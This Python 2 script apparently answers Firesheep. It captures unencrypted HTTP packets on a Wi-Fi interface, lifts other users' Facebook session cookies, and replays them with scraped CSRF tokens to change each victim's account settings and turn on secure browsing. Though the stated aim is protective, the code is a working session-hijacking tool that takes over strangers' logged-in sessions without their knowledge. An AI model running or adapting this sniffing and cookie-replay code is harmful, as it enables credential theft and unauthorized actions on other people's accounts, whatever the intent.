import getopt, sys, pcap, dpkt, re, httplib
import requests
from pyquery import PyQuery as pq

def re_extract(rex, data):
    m = re.search(rex, data)
    if m:
        return m.groups()[0]

class Facebook:
    name = "Facebook"
    site = ".facebook.com"
    host = "www.facebook.com"
    settings_url = "https://www.facebook.com/settings?tab=security&section=browsing&t"
    url = "/ajax/settings/security/browsing.php"
    payload = {"post_form_id": None,
                "fb_dtsg": None,
                "secure_browsing": "1"
              }

    def extract_user(self, session):
        return re_extract("c_user=([^;]+)", session['Cookie'])

    def secure(self, session):
        payload = self.payload.copy()

        settings_page = requests.get(self.settings_url, headers=session).content
        q=pq(settings_page)

        #TODO: refacter
        post_form_id = q("[name=post_form_id]")[0].value
        payload["post_form_id"] = post_form_id

        fb_dtsg = q("[name=fb_dtsg]")[0].value
        payload["fb_dtsg"] = fb_dtsg

        url = 'https://' + session['Host'] + self.url
        print 'sending payload', payload
        r = requests.post(url, data=payload, headers=session)

handlers = [Facebook]

class AutoSecure:
    def __init__(self, device="wlan0"):
        self.device = device
        self.secured_users = set()

    def get_packets(self):
        cap = pcap.pcap(self.device)
        cap.setfilter('dst port 80')
        for ts, raw in cap:
            eth = dpkt.ethernet.Ethernet(raw)
            if isinstance(eth.data, str):
                data = eth.data
            else:
                data = eth.data.data.data
            yield ts, data

    def get_sessions(self):
        for ts, data in self.get_packets():
            session = self.extract_session(data)
            if session:
                yield session

    def extract_session(self, packet):
        host = re_extract('Host: ([^\r\n]+)', packet)
        if not host:
            return
        cookie = re_extract('Cookie: ([^\r\n]+)', packet)
        if not cookie:
            return
        ua = re_extract('User-Agent: ([^\r\n]+)', packet)
        if not ua:
            ua = DEFAULT_UA
        return {
            'Host': host,
            'Cookie': cookie,
            'User-Agent': ua,
        }

    def secure_sesion(self, session):
        for handler in handlers:
            if session['Host'].endswith(handler.site):
                h = handler()
                user = h.extract_user(session)
                if user  in self.secured_users:
                    return
                print "Securing", h.name, user
                self.secured_users.add(user)
                return h.secure(session)

    def secure_sheep(self):
        for s in self.get_sessions():
            self.secure_sesion(s)

if __name__ == "__main__":
    a = AutoSecure()
    a.secure_sheep()
